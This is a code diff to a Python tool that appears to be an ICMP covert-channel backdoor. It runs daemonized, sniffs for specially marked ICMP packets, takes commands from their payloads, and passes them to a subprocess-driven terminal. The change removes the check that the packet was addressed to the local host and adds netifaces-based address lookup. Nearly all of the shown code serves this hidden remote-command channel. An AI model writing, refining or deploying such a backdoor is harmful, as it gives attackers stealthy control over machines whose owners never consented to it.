@@ -2,12 +2,12 @@ import argparse
 import subprocess
 import sys
 import threading
-import socket
 
 from daemoniker import Daemonizer
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, sendp
+from netifaces import interfaces, ifaddresses, AF_INET
 
 import config
 import opening_terminal
@@ -16,12 +16,6 @@ from opening_terminal import p
 destination_mac = "ff:ff:ff:ff:ff:ff"
 destination_ip = ""
 is_debug = 0
-
-
-def get_local_ip():
-    hostname = socket.gethostname()
-    local_ip = socket.gethostbyname(hostname)
-    return local_ip
 
 
 def readstdout():
@@ -54,8 +48,7 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if (packet[IP].dst == get_local_ip() and packet[ICMP].code == config.REQUEST_CODE and
-            packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE):
+    if packet[ICMP].code == config.REQUEST_CODE and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
         destination_ip = packet[IP].src
         destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
@@ -91,6 +84,7 @@ with Daemonizer() as (is_setup, daemonizer):
             is_debug = 1
 
         if is_debug:
+            get_ip_addresses()
             sniff_in_debug()
 
     is_parent, is_debug, destination_mac, destination_ip = daemonizer(
